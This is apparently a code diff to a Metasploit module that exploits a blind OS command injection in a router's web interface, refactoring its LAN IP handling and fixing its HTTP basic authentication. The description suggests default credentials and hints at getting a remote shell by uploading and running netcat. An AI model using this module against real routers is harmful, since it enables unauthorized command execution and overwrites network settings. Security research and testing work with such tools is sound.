@@ -20,13 +20,12 @@ class Metasploit3 < Msf::Auxiliary
 				of the application.
 				Default credentials are always a good starting point. admin/admin or admin
 				and blank password could be a first try.
-				Note: This is a blind os command injection vulnerability. This means that
+				Note: This is a blind OS command injection vulnerability. This means that
 				you will not see any output of your command. Try a ping command to your
-				local system for a first test.
+				local system and observe the packets with tcpdump (or equivalent) for a first test.
 
 				Hint: To get a remote shell you could upload a netcat binary and exec it.
-				WARNING: Backup your network and dhcp configuration. We will overwrite it!
-				Have phun
+				WARNING: this module will overwrite network and DHCP configuration.
 			},
 			'Author'          => [ 'm-1-k-3' ],
 			'License'         => MSF_LICENSE,
@@ -50,11 +49,21 @@ class Metasploit3 < Msf::Auxiliary
 				OptString.new('PASSWORD',[ false, 'Password to login with', 'password']),
 				OptString.new('CMD', [ true, 'The command to execute', 'ping 127.0.0.1']),
 				OptString.new('NETMASK', [ false, 'LAN Netmask of the router', '255.255.255.0']),
-				OptAddress.new('LANIP', [ false, 'LAN IP address of the router - CHANGE THIS', '1.1.1.1']),
+				OptAddress.new('LANIP', [ false, 'LAN IP address of the router (default is RHOST)']),
 				OptString.new('ROUTER_NAME', [ false, 'Name of the router', 'cisco']),
 				OptString.new('WAN_DOMAIN', [ false, 'WAN Domain Name', 'test']),
 				OptString.new('WAN_MTU', [ false, 'WAN MTU', '1500'])
 			], self.class)
+	end
+
+	# If the user configured LANIP, use it. Otherwise, use RHOST.
+	# NB: This presumes a dotted quad ip address.
+	def lan_ip
+		if datastore['LANIP'].to_s.empty?
+			datastore['RHOST']
+		else
+			datastore['LANIP']
+		end
 	end
 
 	def run
@@ -67,13 +76,7 @@ class Metasploit3 < Msf::Auxiliary
 		wandomain = datastore['WAN_DOMAIN']
 		wanmtu = datastore['WAN_MTU']
 
-		if datastore['LANIP'] !~ /1.1.1.1/
-			#there is a configuration from the user so we use LANIP for the router configuration
-			ip = datastore['LANIP'].split('.')
-		else
-			#no configuration from user so we use RHOST for the router configuration
-			ip = rhost.split('.')
-		end
+		ip = lan_ip.split('.')
 
 		if datastore['PASSWORD'].nil?
 			pass = ""
@@ -87,7 +90,7 @@ class Metasploit3 < Msf::Auxiliary
 			res = send_request_cgi({
 				'uri'	 => uri,
 				'method'  => 'GET',
-				'basic_auth' => "#{user}:#{pass}"
+				'authorization' => basic_auth(user,pass)
 			})
 
 			unless (res.kind_of? Rex::Proto::Http::Response)
@@ -133,7 +136,7 @@ class Metasploit3 < Msf::Auxiliary
 			res = send_request_cgi({
 				'uri'	=> uri,
 				'method' => 'POST',
-				'basic_auth' => "#{pass}:#{pass}",
+				'authorization' => basic_auth(user,pass),
 				#'data' => data_cmd,
 
 				'vars_post' => {
